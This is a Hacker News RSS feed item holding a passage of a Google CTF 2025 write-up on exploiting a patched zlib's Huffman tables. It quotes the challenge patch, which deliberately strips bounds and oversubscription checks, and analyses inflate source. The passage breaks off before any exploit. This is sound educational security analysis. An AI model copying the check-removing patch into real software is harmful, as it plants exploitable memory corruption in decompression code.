<?xml version='1.0' encoding='UTF-8'?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><id>hnrss.org/frontpage</id><title>Hacker News: Front Page</title><updated>2025-09-30T17:09:28.334554+00:00</updated><link href="https://news.ycombinator.com/" rel="alternate"/><link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><generator uri="https://lkiesow.github.io/python-feedgen" version="1.0.0">python-feedgen</generator><subtitle>Hacker News RSS</subtitle><entry><id>https://news.ycombinator.com/item?id=45422653</id><title>Google CTF 2025 – webz : Exploiting zlib's Huffman Code Table</title><updated>2025-09-30T17:09:37.253944+00:00</updated><content>&lt;doc fingerprint="ee9112fdb84841d9"&gt;
  &lt;main&gt;&lt;quote&gt;&lt;p&gt;한국어: https://velog.io/@0range1337/CTF-Google-CTF-2025-webz-Exploiting-zlibs-Huffman-Code-Table&lt;/p&gt;&lt;/quote&gt;&lt;code&gt;1. Overview
2. Background
	2-1. google-zlib-Increase-Huffman-Table-Size.patch
	2-2. Deflate Algorithm
		2-2-1. LZ77
		2-2-2. Huffman Coding
3. Code Analysis
	3-1. Inflate
	3-2. Huffman Table
	3-3. Decode
4. Vulnerability
	4-1. Unintialized Huffman Code Table
	4-2. Exploiting inflate_fast
    	4-2-1. Integer Overflow (Unexploitable)
    	4-2-2. PoC
        4-2-3. Stream Overflow (Exploitable)
    	4-2-4. PoC
5. Exploit&lt;/code&gt;&lt;p&gt;&lt;code&gt;webz&lt;/code&gt; is a zlib exploitation challenge from Google CTF 2025. The Google-zlib implementation provided in the challenge is not upstream; it’s a version with an arbitrary patch applied. Whereas typical open‑source exploit challenges ship a patch that clearly introduces a vulnerability, &lt;code&gt;webz&lt;/code&gt;’s Google-zlib patch appears—at first glance—to be a normal optimization.&lt;/p&gt;&lt;p&gt;In practice, the vulnerability in this Google-zlib can be found quickly via fuzzing. However, in this write‑up we’ll derive the precise root cause through source analysis.&lt;/p&gt;&lt;p&gt;The Google-zlib codebase isn’t large, but it is quite tricky. Because it implements compression algorithms, manipulates data at the bit level, and contains optimizations that sacrifice readability, analysis can be difficult.&lt;/p&gt;&lt;code&gt;// webz.c:L114
    int ret = inflateInit2(&amp;amp;webz_state.infstream, -15);
    webz_state.infstream.msg = webz_state.ok_status;

    if (ret != Z_OK) {
        printf("Error: inflateInit failed: %d\n", ret);
        return;
    }

    ret = inflate(&amp;amp;webz_state.infstream, Z_NO_FLUSH);

    if (ret != Z_STREAM_END) {
        printf("Error: inflate failed: %d\n", ret);
        inflateEnd(&amp;amp;webz_state.infstream);
        return;
    }

    inflateEnd(&amp;amp;webz_state.infstream);&lt;/code&gt;&lt;quote&gt;&lt;code&gt;// zlib.h\:L570 /\* windowBits can also be -8..-15 for raw deflate. In this case, -windowBits determines the window size. deflate() will then generate raw deflate data with no zlib header or trailer, and will not compute a check value. \*/&lt;/code&gt;&lt;/quote&gt;&lt;p&gt;First, let’s look at the provided &lt;code&gt;webz.c&lt;/code&gt;. It’s simply a wrapper around Google-zlib. It receives raw Deflate-compressed data from the user and decompresses it using Google-zlib’s &lt;code&gt;inflate&lt;/code&gt;. Therefore, we must identify vulnerabilities in the code that implements &lt;code&gt;inflate&lt;/code&gt;: &lt;code&gt;inflate.c&lt;/code&gt;, &lt;code&gt;inftrees.c&lt;/code&gt;, and &lt;code&gt;inffast.c&lt;/code&gt;.&lt;/p&gt;&lt;quote&gt;&lt;item&gt;inflate.c&lt;/item&gt;&lt;lb/&gt;The core of the&lt;code&gt;inflate&lt;/code&gt;implementation. The&lt;code&gt;inflate&lt;/code&gt;function is a virtual finite-state machine, treating the given compressed data like opcodes for a virtual machine. As we’ll examine later, it processes compressed data in blocks.&lt;item&gt;inftrees.c&lt;/item&gt;&lt;lb/&gt;One of the compression techniques used in&lt;code&gt;Deflate&lt;/code&gt;is Huffman coding. To decode Huffman-coded data in the&lt;code&gt;inflate&lt;/code&gt;implementation, a Huffman table must be constructed;&lt;code&gt;inftrees.c&lt;/code&gt;contains that Huffman table construction code.&lt;item&gt;inffast.c&lt;/item&gt;&lt;code&gt;inffast.c&lt;/code&gt;contains&lt;code&gt;inflate_fast&lt;/code&gt;, a high-speed implementation of&lt;code&gt;inflate&lt;/code&gt;decoding. Under certain conditions,&lt;code&gt;inflate&lt;/code&gt;calls&lt;code&gt;inflate_fast&lt;/code&gt;to decode data.&lt;/quote&gt;&lt;code&gt;From 2c282408771115b3cf80eeb9572927b796ddea79 Mon Sep 17 00:00:00 2001
From: Brendon Tiszka &amp;lt;tiszka@google.com&amp;gt;
Date: Wed, 21 May 2025 15:11:52 +0000
Subject: [PATCH] [google-zlib] Increase Huffman Table Size

The basic idea is to use a bigger root &amp;amp; secondary table for both
dists and lens, allowing us to avoid oversubscription chekcs.
---
 inftrees.c | 18 ------------------
 inftrees.h | 18 +++++-------------
 2 files changed, 5 insertions(+), 31 deletions(-)

diff --git a/inftrees.c b/inftrees.c
index a127e6b..7a8dd2e 100644
--- a/inftrees.c
+++ b/inftrees.c
@@ -122,16 +122,6 @@ int ZLIB_INTERNAL inflate_table(codetype type, unsigned short FAR *lens,
         if (count[min] != 0) break;
     if (root &amp;lt; min) root = min;
 
-    /* check for an over-subscribed or incomplete set of lengths */
-    left = 1;
-    for (len = 1; len &amp;lt;= MAXBITS; len++) {
-        left &amp;lt;&amp;lt;= 1;
-        left -= count[len];
-        if (left &amp;lt; 0) return -1;        /* over-subscribed */
-    }
-    if (left &amp;gt; 0 &amp;amp;&amp;amp; (type == CODES || max != 1))
-        return -1;                      /* incomplete set */
-
     /* generate offsets into symbol table for each length for sorting */
     offs[1] = 0;
     for (len = 1; len &amp;lt; MAXBITS; len++)
@@ -200,11 +190,6 @@ int ZLIB_INTERNAL inflate_table(codetype type, unsigned short FAR *lens,
     used = 1U &amp;lt;&amp;lt; root;          /* use root table entries */
     mask = used - 1;            /* mask for comparing low */
 
-    /* check available table space */
-    if ((type == LENS &amp;amp;&amp;amp; used &amp;gt; ENOUGH_LENS) ||
-        (type == DISTS &amp;amp;&amp;amp; used &amp;gt; ENOUGH_DISTS))
-        return 1;
-
     /* process all codes and make table entries */
     for (;;) {
         /* create table entry */
@@ -270,9 +255,6 @@ int ZLIB_INTERNAL inflate_table(codetype type, unsigned short FAR *lens,
 
             /* check for enough space */
             used += 1U &amp;lt;&amp;lt; curr;
-            if ((type == LENS &amp;amp;&amp;amp; used &amp;gt; ENOUGH_LENS) ||
-                (type == DISTS &amp;amp;&amp;amp; used &amp;gt; ENOUGH_DISTS))
-                return 1;
 
             /* point entry in root table to sub-table */
             low = huff &amp;amp; mask;
diff --git a/inftrees.h b/inftrees.h
index 396f74b..42c2c44 100644
--- a/inftrees.h
+++ b/inftrees.h
@@ -35,19 +35,11 @@ typedef struct {
     01000000 - invalid code
  */
 
-/* Maximum size of the dynamic table.  The maximum number of code structures is
-   1444, which is the sum of 852 for literal/length codes and 592 for distance
-   codes.  These values were found by exhaustive searches using the program
-   examples/enough.c found in the zlib distribution.  The arguments to that
-   program are the number of symbols, the initial root table size, and the
-   maximum bit length of a code.  "enough 286 9 15" for literal/length codes
-   returns 852, and "enough 30 6 15" for distance codes returns 592. The
-   initial root table size (9 or 6) is found in the fifth argument of the
-   inflate_table() calls in inflate.c and infback.c.  If the root table size is
-   changed, then these maximum sizes would be need to be recalculated and
-   updated. */
-#define ENOUGH_LENS 852
-#define ENOUGH_DISTS 592
+/* Memory/speed tradeoff. Alocate more-than-ENOUGH space for LENS and
+   DISTS so we can remove overflow checks from `inflate`.
+*/
+#define ENOUGH_LENS (1 &amp;lt;&amp;lt; 15)
+#define ENOUGH_DISTS (1 &amp;lt;&amp;lt; 15)
 #define ENOUGH (ENOUGH_LENS+ENOUGH_DISTS)
 
 /* Type of code to build for inflate_table() */
-- 
2.50.0.rc0.642.g800a2b2222-goog
&lt;/code&gt;&lt;p&gt;The Google-zlib source shipped with the challenge contains a &lt;code&gt;0001-google-zlib-Increase-Huffman-Table-Size.patch&lt;/code&gt;. From that patch we can see the code has been modified as above.&lt;/p&gt;&lt;p&gt;The patch removes some checks in &lt;code&gt;inftrees.c&lt;/code&gt; and greatly increases the values of &lt;code&gt;ENOUGH_LENS&lt;/code&gt; and &lt;code&gt;ENOUGH_DISTS&lt;/code&gt;. From the comments, the patch increases the sizes of Huffman tables and removes related checks to achieve a memory/speed tradeoff optimization. At this point we don’t yet know exactly what issues this introduces, but it’s clear the vulnerability will be related to Huffman tables and Huffman coding.&lt;/p&gt;&lt;p&gt;Before analyzing the code, let’s review the Deflate compression algorithm. Deflate uses Huffman coding and the LZ77 algorithm to compress data.&lt;/p&gt;&lt;p&gt;The principle of the LZ77 algorithm is very simple: repeated data is replaced by (length, distance) pairs.&lt;/p&gt;&lt;code&gt;ABCDEEABCDFF -&amp;gt; ABCDEE(4,6)FF&lt;/code&gt;&lt;p&gt;The length is how many bytes to copy, and the distance is how far back from the current position the source data lies.&lt;/p&gt;&lt;p&gt;Huffman coding is a bit more involved. The basic idea is to replace original data with compressed bit sequences. While the minimum unit of data is typically a byte (8 bits), replacing values with shorter bit sequences reduces size.&lt;/p&gt;&lt;code&gt;ABABAAAABBBB (12 Byte, 96bit) -&amp;gt; 010100001111 ( 1.5 Byte, 12bit)&lt;/code&gt;&lt;p&gt;In this example there are only two symbols, A and B, which can be encoded with 1-bit Huffman codes (0 and 1). If there are more than two symbols, you obviously cannot compress them all with 1-bit codes.&lt;/p&gt;&lt;code&gt;A -&amp;gt; 00
B -&amp;gt; 01
C -&amp;gt; 10
D -&amp;gt; 110
E -&amp;gt; 111

ABCDABCEABC -&amp;gt; 000110110000110111&lt;/code&gt;&lt;quote&gt;&lt;p&gt;As shown, Huffman codes depend on the data being compressed, so to decode the compressed data, you need a table mapping {Huffman code : actual value}.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;A Huffman code cannot be the prefix of another Huffman code. For example, if 111 is a code, then 11 cannot be a code; since codes have variable length, a prefix collision like 1110 would be ambiguous—unclear whether it’s 111 + 0 or 11 + 10.&lt;/p&gt;&lt;p&gt;Also, the minimum and maximum code lengths vary depending on the number of distinct data values. Huffman coding assigns shorter codes (e.g., 2 bits) to high-frequency values (A, B, C) and longer codes (e.g., 3 bits) to low-frequency values (D, E) to compress effectively.&lt;/p&gt;&lt;p&gt;Additionally, consider this: if Deflate generates efficient Huffman codes tailored to the input, then the decoder needs the corresponding Huffman table to decode. Therefore, Deflate uses either fixed Huffman tables or dynamic Huffman tables depending on the situation.&lt;/p&gt;&lt;quote&gt;&lt;item&gt;Fixed Huffman table&lt;/item&gt;&lt;lb/&gt;Predefined in Deflate/Inflate. It doesn’t always give the most efficient compression for the data, but you don’t need to include a Huffman table in the final compressed stream.&lt;item&gt;Dynamic Huffman table&lt;/item&gt;&lt;lb/&gt;Performs optimal Huffman coding for the given data, and includes in the final compressed data the Huffman table necessary to decode it.&lt;/quote&gt;&lt;p&gt;Let’s elaborate on “including the Huffman table in the final compressed data.” In the standard implementation, the Huffman table can be represented using only code lengths.&lt;/p&gt;&lt;code&gt;A -&amp;gt; 00
B -&amp;gt; 01
C -&amp;gt; 10
D -&amp;gt; 110
E -&amp;gt; 111&lt;/code&gt;&lt;p&gt;Rather than storing the entire codes as above, you can store just the code lengths:&lt;/p&gt;&lt;code&gt;A -&amp;gt; 2
B -&amp;gt; 2
C -&amp;gt; 2
D -&amp;gt; 3
E -&amp;gt; 3&lt;/code&gt;&lt;p&gt;Since actual Huffman codes have lengths in the range 3–15 bits, storing only lengths reduces the size of the embedded Huffman tables.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Separately from using code lengths to compress the Huffman table, Google‑zlib compresses the lengths themselves again using Huffman coding. We’ll discuss this in more detail during the source analysis below.&lt;/p&gt;&lt;/quote&gt;&lt;code&gt;huffman_table['A'] = 2
huffman_table['B'] = 2
huffman_table['C'] = 2
huffman_table['D'] = 3
huffman_table['E'] = 3&lt;/code&gt;&lt;p&gt;This works for a simple reason. A Huffman table is an array indexed by the original symbol. Assign the first 2-bit code 00 to A; then B gets 01, C gets 10, and so on. Using only lengths and order, all codes are recoverable. In other words, if Deflate assigns codes in order, Inflate can reconstruct them from just the lengths.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Deflate uses Huffman coding not only for literal values (0–255), but also for the LZ77 (length, distance) pairs.&lt;/p&gt;&lt;/quote&gt;&lt;code&gt;int ZEXPORT inflate(z_streamp strm, int flush) {
    struct inflate_state FAR *state;
    z_const unsigned char FAR *next;    /* next input */
    unsigned char FAR *put;     /* next output */
    unsigned have, left;        /* available input and output */
    unsigned long hold;         /* bit buffer */
    unsigned bits;              /* bits in bit buffer */
    unsigned in, out;           /* save starting available input and output */
    unsigned copy;              /* number of stored or match bytes to copy */
    unsigned char FAR *from;    /* where to copy match bytes from */
    code here;                  /* current decoding table entry */
    code last;                  /* parent table entry */
    unsigned len;               /* length to copy for repeats, bits to drop */
    int ret;                    /* return code */
#ifdef GUNZIP
    unsigned char hbuf[4];      /* buffer for gzip header crc calculation */
#endif
    static const unsigned short order[19] = /* permutation of code lengths */
        {16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15};

    if (inflateStateCheck(strm) || strm-&amp;gt;next_out == Z_NULL ||
        (strm-&amp;gt;next_in == Z_NULL &amp;amp;&amp;amp; strm-&amp;gt;avail_in != 0))
        return Z_STREAM_ERROR;

    state = (struct inflate_state FAR *)strm-&amp;gt;state;
    if (state-&amp;gt;mode == TYPE) state-&amp;gt;mode = TYPEDO;      /* skip check */
    LOAD();
    in = have;
    out = left;
    ret = Z_OK;
    for (;;)
        switch (state-&amp;gt;mode) {
        case HEAD:
            if (state-&amp;gt;wrap == 0) {
                state-&amp;gt;mode = TYPEDO;
                break;
            }
            ...&lt;/code&gt;&lt;p&gt;&lt;code&gt;inflate&lt;/code&gt; is a virtual finite-state machine. It treats the compressed data stream (&lt;code&gt;strm&lt;/code&gt;) as opcodes and executes like a VM. Since &lt;code&gt;inflateInit2_&lt;/code&gt; sets &lt;code&gt;state-&amp;gt;mode = HEAD&lt;/code&gt;, it transitions to &lt;code&gt;state-&amp;gt;mode = TYPEDO&lt;/code&gt;, and then hits the &lt;code&gt;case TYPEDO&lt;/code&gt;.&lt;/p&gt;&lt;code&gt;/* Load registers with state in inflate() for speed */
#define LOAD() \
    do { \
        put = strm-&amp;gt;next_out; \
        left = strm-&amp;gt;avail_out; \
        next = strm-&amp;gt;next_in; \
        have = strm-&amp;gt;avail_in; \
        hold = state-&amp;gt;hold; \
        bits = state-&amp;gt;bits; \
    } while (0)

/* Restore state from registers in inflate() */
#define RESTORE() \
    do { \
        strm-&amp;gt;next_out = put; \
        strm-&amp;gt;avail_out = left; \
        strm-&amp;gt;next_in = next; \
        strm-&amp;gt;avail_in = have; \
        state-&amp;gt;hold = hold; \
        state-&amp;gt;bits = bits; \
    } while (0)&lt;/code&gt;&lt;quote&gt;&lt;code&gt;strm-&amp;gt;next_out&lt;/code&gt;: end pointer of the decompressed output buffer that’s been filled so far&lt;code&gt;strm-&amp;gt;avail_out&lt;/code&gt;: remaining size of the decompression buffer&lt;code&gt;strm-&amp;gt;next_in&lt;/code&gt;: end pointer of the processed input data&lt;code&gt;strm-&amp;gt;avail_in&lt;/code&gt;: remaining number of input bytes to process&lt;code&gt;state-&amp;gt;hold&lt;/code&gt;: buffer used for bit operations&lt;code&gt;state-&amp;gt;bits&lt;/code&gt;: current bit length stored in&lt;code&gt;state-&amp;gt;hold&lt;/code&gt;&lt;/quote&gt;&lt;p&gt;Before the main loop, let’s note some macros and variables used by Inflate. Members of the &lt;code&gt;strm&lt;/code&gt; structure don’t benefit from register optimization, so these macros copy them into locals for faster operations.&lt;/p&gt;&lt;code&gt;/* Get a byte of input into the bit accumulator, or return from inflate()
   if there is no input available. */
#define PULLBYTE() \
    do { \
        if (have == 0) goto inf_leave; \
        have--; \
        hold += (unsigned long)(*next++) &amp;lt;&amp;lt; bits; \
        bits += 8; \
    } while (0)

/* Assure that there are at least n bits in the bit accumulator.  If there is
   not enough available input to do that, then return from inflate(). */
#define NEEDBITS(n) \
    do { \
        while (bits &amp;lt; (unsigned)(n)) \
            PULLBYTE(); \
    } while (0)

/* Return the low n bits of the bit accumulator (n &amp;lt; 16) */
#define BITS(n) \
    ((unsigned)hold &amp;amp; ((1U &amp;lt;&amp;lt; (n)) - 1))

/* Remove n bits from the bit accumulator */
#define DROPBITS(n) \
    do { \
        hold &amp;gt;&amp;gt;= (n); \
        bits -= (unsigned)(n); \
    } while (0)&lt;/code&gt;&lt;p&gt;Unlike byte-oriented data, compressed data is processed at bit granularity because of packing and Huffman coding. The Inflate implementation uses macros like these to fill a bit buffer (&lt;code&gt;hold&lt;/code&gt;) and manipulate it bitwise.&lt;/p&gt;&lt;p&gt;The basic logic is: use &lt;code&gt;NEEDBITS&lt;/code&gt; to pull bits from &lt;code&gt;strm-&amp;gt;next_in&lt;/code&gt; (&lt;code&gt;next&lt;/code&gt;) into &lt;code&gt;state-&amp;gt;hold&lt;/code&gt; (&lt;code&gt;hold&lt;/code&gt;), decreasing &lt;code&gt;strm-&amp;gt;avail_in&lt;/code&gt; (&lt;code&gt;have&lt;/code&gt;) accordingly. Then extract as many bits as needed with &lt;code&gt;BITS&lt;/code&gt;, and drop consumed bits with &lt;code&gt;DROPBITS&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Using this bit-level handling, the code decodes the compressed data and appends the decoded bytes to &lt;code&gt;strm-&amp;gt;next_out&lt;/code&gt; (&lt;code&gt;put&lt;/code&gt;), decreasing &lt;code&gt;strm-&amp;gt;avail_out&lt;/code&gt; (&lt;code&gt;left&lt;/code&gt;) by the number of bytes written.&lt;/p&gt;&lt;code&gt;        case TYPEDO:
            if (state-&amp;gt;last) {
                BYTEBITS();
                state-&amp;gt;mode = CHECK;
                break;
            }
            NEEDBITS(3);
            state-&amp;gt;last = BITS(1);
            DROPBITS(1);
            switch (BITS(2)) {
            case 0:                             /* stored block */
                Tracev((stderr, "inflate:     stored block%s\n",
                        state-&amp;gt;last ? " (last)" : ""));
                state-&amp;gt;mode = STORED;
                break;
            case 1:                             /* fixed block */
                fixedtables(state);
                Tracev((stderr, "inflate:     fixed codes block%s\n",
                        state-&amp;gt;last ? " (last)" : ""));
                state-&amp;gt;mode = LEN_;             /* decode codes */
                if (flush == Z_TREES) {
                    DROPBITS(2);
                    goto inf_leave;
                }
                break;
            case 2:                             /* dynamic block */
                Tracev((stderr, "inflate:     dynamic codes block%s\n",
                        state-&amp;gt;last ? " (last)" : ""));
                state-&amp;gt;mode = TABLE;
                break;
            case 3:
                strm-&amp;gt;msg = (z_const char *)"invalid block type";
                state-&amp;gt;mode = BAD;
            }
            DROPBITS(2);
            break;&lt;/code&gt;&lt;p&gt;Back in &lt;code&gt;inflate&lt;/code&gt;, compressed data is processed in blocks, starting at &lt;code&gt;case TYPEDO&lt;/code&gt;. After ensuring at least 3 bits in the buffer (&lt;code&gt;NEEDBITS(3)&lt;/code&gt;), it reads 1 bit with &lt;code&gt;BITS(1)&lt;/code&gt; to set &lt;code&gt;state-&amp;gt;last&lt;/code&gt;, which indicates whether this block is the last one. It then drops that bit and uses the next two bits to select the block type.&lt;/p&gt;&lt;quote&gt;&lt;item&gt;stored block (0): a block of uncompressed data. When&lt;/item&gt;&lt;code&gt;state-&amp;gt;mode = STORED&lt;/code&gt;, it will directly copy from&lt;code&gt;strm-&amp;gt;next_in&lt;/code&gt;to&lt;code&gt;strm-&amp;gt;next_out&lt;/code&gt;.&lt;item&gt;fixed codes block (1): data compressed with the fixed Huffman table.&lt;/item&gt;&lt;code&gt;fixedtables(state)&lt;/code&gt;builds the fixed table, then&lt;code&gt;state-&amp;gt;mode = LEN_&lt;/code&gt;moves to the Huffman decoding path.&lt;item&gt;dynamic codes block (2): data compressed with a dynamic Huffman table.&lt;/item&gt;&lt;code&gt;state-&amp;gt;mode = TABLE&lt;/code&gt;reads dynamic table info from the compressed stream, constructs the dynamic Huffman table, then proceeds to decode.&lt;/quote&gt;&lt;p&gt;Blocks have the following forms:&lt;/p&gt;&lt;code&gt;[0(stored_bock) + state-&amp;gt;last + length to copy + uncompressed bytes to copy]
[1(fixed codes block) + state-&amp;gt;last + compressed data (Huffman codes) + Huffman code for End of Block]
[2(Dynamic codes block) + state-&amp;gt;last + dynamic table info (Code Huffman table + compressed Literal/Length and Distance Huffman tables) + compressed data (Huffman codes) + Huffman code for End of Block ]&lt;/code&gt;&lt;p&gt;The compressed stream consists of one or more blocks, and &lt;code&gt;inflate&lt;/code&gt; decodes each according to the code above.&lt;/p&gt;&lt;code&gt;        case TABLE:
            NEEDBITS(14);
            state-&amp;gt;nlen = BITS(5) + 257;
            DROPBITS(5);
            state-&amp;gt;ndist = BITS(5) + 1;
            DROPBITS(5);
            state-&amp;gt;ncode = BITS(4) + 4;
            DROPBITS(4);
#ifndef PKZIP_BUG_WORKAROUND
            if (state-&amp;gt;nlen &amp;gt; 286 || state-&amp;gt;ndist &amp;gt; 30) {
                strm-&amp;gt;msg = (z_const char *)"too many length or distance symbols";
                state-&amp;gt;mode = BAD;
                break;
            }
#endif
            Tracev((stderr, "inflate:       table sizes ok\n"));
            state-&amp;gt;have = 0;
            state-&amp;gt;mode = LENLENS;
                /* fallthrough */&lt;/code&gt;&lt;p&gt;Let’s look at how a dynamic Huffman table is built. As noted earlier, a dynamic codes block includes a Code Huffman table, and compressed Literal/Length and Distance tables. The code above reads the lengths for those three tables.&lt;/p&gt;&lt;p&gt;The Literal/Length table contains codes for literal bytes (A, B, …) and for LZ77 lengths; the Distance table holds codes for LZ77 distances. Using these two tables, the decoder performs Huffman and LZ77 decoding. So what is the Code Huffman table? The Literal/Length and Distance tables are stored compressed in the stream—again via Huffman coding. The Code Huffman table is the dynamic Huffman table used to decode the Huffman tables (lengths) themselves.&lt;/p&gt;&lt;code&gt;        case LENLENS:
            while (state-&amp;gt;have &amp;lt; state-&amp;gt;ncode) {
                NEEDBITS(3);
                state-&amp;gt;lens[order[state-&amp;gt;have++]] = (unsigned short)BITS(3);
                DROPBITS(3);
            }
            while (state-&amp;gt;have &amp;lt; 19)
                state-&amp;gt;lens[order[state-&amp;gt;have++]] = 0;
            state-&amp;gt;next = state-&amp;gt;codes;
            state-&amp;gt;lencode = state-&amp;gt;distcode = (const code FAR *)(state-&amp;gt;next);
            state-&amp;gt;lenbits = 7;
            ret = inflate_table(CODES, state-&amp;gt;lens, 19, &amp;amp;(state-&amp;gt;next),
                                &amp;amp;(state-&amp;gt;lenbits), state-&amp;gt;work);
            if (ret) {
                strm-&amp;gt;msg = (z_const char *)"invalid code lengths set";
                state-&amp;gt;mode = BAD;
                break;
            }
            Tracev((stderr, "inflate:       code lengths ok\n"));
            state-&amp;gt;have = 0;
            state-&amp;gt;mode = CODELENS;
                /* fallthrough */&lt;/code&gt;&lt;p&gt;First, we read the Code Huffman table lengths. We loop &lt;code&gt;state-&amp;gt;ncode&lt;/code&gt; times and read 3 bits each time into &lt;code&gt;state-&amp;gt;lens&lt;/code&gt;. These 3-bit values are code lengths—the Huffman table is represented by lengths, not the full bit patterns, as discussed earlier. Thus, &lt;code&gt;state-&amp;gt;lens&lt;/code&gt; records the Code Huffman table’s code lengths in the &lt;code&gt;order&lt;/code&gt; permutation.&lt;/p&gt;&lt;code&gt;static const unsigned short order[19] = /* permutation of code lengths */
        {16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15};&lt;/code&gt;&lt;p&gt;Here, &lt;code&gt;order&lt;/code&gt; reduces the size of the encoded Code Huffman table. The Code table decodes original values 0–18. Storing lengths for all 19 values would be inefficient.&lt;/p&gt;&lt;p&gt;Typically, codes are used more frequently in the same order as &lt;code&gt;order&lt;/code&gt;. If we stored lengths in plain 0–18 order, we’d need to write zeros for many unused values (e.g., 0–15) before the frequently used 16, 17, 18. By ordering them as above, we can store just the lengths for the frequently used codes and leave the rest implicit. The code reflects this: it reads &lt;code&gt;state-&amp;gt;ncode&lt;/code&gt; lengths, and sets the remaining entries to zero.&lt;/p&gt;&lt;p&gt;We then set &lt;code&gt;state-&amp;gt;next&lt;/code&gt; to point into &lt;code&gt;state-&amp;gt;codes&lt;/code&gt;, and call &lt;code&gt;inflate_table&lt;/code&gt; to build the Huffman table. The resulting table is written at &lt;code&gt;state-&amp;gt;next&lt;/code&gt; (&lt;code&gt;state-&amp;gt;lencode&lt;/code&gt;). We’ll cover &lt;code&gt;inflate_table&lt;/code&gt; shortly. For now, note the parameters: &lt;code&gt;CODES&lt;/code&gt; (build the Code table), &lt;code&gt;state-&amp;gt;lens&lt;/code&gt; (length array), &lt;code&gt;19&lt;/code&gt; (number of symbols, 0–18), &lt;code&gt;&amp;amp;(state-&amp;gt;next)&lt;/code&gt; (output pointer for the constructed table), &lt;code&gt;&amp;amp;(state-&amp;gt;lenbits)&lt;/code&gt; (table index bit width—initially 7, but may be adjusted by &lt;code&gt;inflate_table&lt;/code&gt;), and &lt;code&gt;state-&amp;gt;work&lt;/code&gt; (a temporary array for sorting).&lt;/p&gt;&lt;code&gt;        case CODELENS:
            while (state-&amp;gt;have &amp;lt; state-&amp;gt;nlen + state-&amp;gt;ndist) {
                for (;;) {
                    here = state-&amp;gt;lencode[BITS(state-&amp;gt;lenbits)];
                    if ((unsigned)(here.bits) &amp;lt;= bits) break;
                    PULLBYTE();
                }
                if (here.val &amp;lt; 16) {
                    DROPBITS(here.bits);
                    state-&amp;gt;lens[state-&amp;gt;have++] = here.val;
                }
                else {
                    if (here.val == 16) {
                        NEEDBITS(here.bits + 2);
                        DROPBITS(here.bits);
                        if (state-&amp;gt;have == 0) {
                            strm-&amp;gt;msg = (z_const char *)"invalid bit length repeat";
                            state-&amp;gt;mode = BAD;
                            break;
                        }
                        len = state-&amp;gt;lens[state-&amp;gt;have - 1];
                        copy = 3 + BITS(2);
                        DROPBITS(2);
                    }
                    else if (here.val == 17) {
                        NEEDBITS(here.bits + 3);
                        DROPBITS(here.bits);
                        len = 0;
                        copy = 3 + BITS(3);
                        DROPBITS(3);
                    }
                    else {
                        NEEDBITS(here.bits + 7);
                        DROPBITS(here.bits);
                        len = 0;
                        copy = 11 + BITS(7);
                        DROPBITS(7);
                    }
                    if (state-&amp;gt;have + copy &amp;gt; state-&amp;gt;nlen + state-&amp;gt;ndist) {
                        strm-&amp;gt;msg = (z_const char *)"invalid bit length repeat";
                        state-&amp;gt;mode = BAD;
                        break;
                    }
                    while (copy--)
                        state-&amp;gt;lens[state-&amp;gt;have++] = (unsigned short)len;
                }
            }

            /* handle error breaks in while */
            if (state-&amp;gt;mode == BAD) break;

            /* check for end-of-block code (better have one) */
            if (state-&amp;gt;lens[256] == 0) {
                strm-&amp;gt;msg = (z_const char *)"invalid code -- missing end-of-block";
                state-&amp;gt;mode = BAD;
                break;
            }

            /* build code tables -- note: do not change the lenbits or distbits
               values here (9 and 6) without reading the comments in inftrees.h
               concerning the ENOUGH constants, which depend on those values */
            state-&amp;gt;next = state-&amp;gt;codes;
            state-&amp;gt;lencode = (const code FAR *)(state-&amp;gt;next);
            state-&amp;gt;lenbits = 9;
            ret = inflate_table(LENS, state-&amp;gt;lens, state-&amp;gt;nlen, &amp;amp;(state-&amp;gt;next),
                                &amp;amp;(state-&amp;gt;lenbits), state-&amp;gt;work);
            if (ret) {
                strm-&amp;gt;msg = (z_const char *)"invalid literal/lengths set";
                state-&amp;gt;mode = BAD;
                break;
            }
            state-&amp;gt;distcode = (const code FAR *)(state-&amp;gt;next);
            state-&amp;gt;distbits = 6;
            ret = inflate_table(DISTS, state-&amp;gt;lens + state-&amp;gt;nlen, state-&amp;gt;ndist,
                            &amp;amp;(state-&amp;gt;next), &amp;amp;(state-&amp;gt;distbits), state-&amp;gt;work);
            if (ret) {
                strm-&amp;gt;msg = (z_const char *)"invalid distances set";
                state-&amp;gt;mode = BAD;
                break;
            }
            Tracev((stderr, "inflate:       codes ok\n"));
            state-&amp;gt;mode = LEN_;
            if (flush == Z_TREES) goto inf_leave;
                /* fallthrough */&lt;/code&gt;&lt;p&gt;Once the Code table is built, we decode the compressed lengths of the Literal/Length and Distance tables. We read &lt;code&gt;state-&amp;gt;lenbits&lt;/code&gt; bits and use the Code table &lt;code&gt;state-&amp;gt;lencode&lt;/code&gt; to decode entries, retrieving a &lt;code&gt;code&lt;/code&gt; struct from the table.&lt;/p&gt;&lt;p&gt;Values 0–18 decoded via the Code table are not literal decoded bytes. Based on the code, they behave as follows:&lt;/p&gt;&lt;quote&gt;&lt;item&gt;0–15: literal code lengths 0–15 directly&lt;/item&gt;&lt;item&gt;16: repeat previous length 3–6 times&lt;/item&gt;&lt;item&gt;17: repeat length 0, 3–10 times&lt;/item&gt;&lt;item&gt;18: repeat length 0, 11–138 times&lt;/item&gt;&lt;/quote&gt;&lt;p&gt;Here “original value” refers to the value decoded by Huffman coding, not necessarily the final decompressed byte. Some values (0–15) correspond to actual lengths, others (16–18) are special symbols.&lt;/p&gt;&lt;code&gt;code here;&lt;/code&gt;&lt;p&gt;We’ll explain this struct in the Huffman table construction section. Depending on its members, various actions occur to ultimately decode each value.&lt;/p&gt;&lt;p&gt;As before, we call &lt;code&gt;inflate_table&lt;/code&gt; to build the final &lt;code&gt;state-&amp;gt;lencode&lt;/code&gt; and &lt;code&gt;state-&amp;gt;distcode&lt;/code&gt; tables for Literal/Length and Distance respectively.&lt;/p&gt;&lt;quote&gt;&lt;p&gt;The Code table is no longer needed, so overwriting&lt;/p&gt;&lt;code&gt;state-&amp;gt;lencode&lt;/code&gt;is 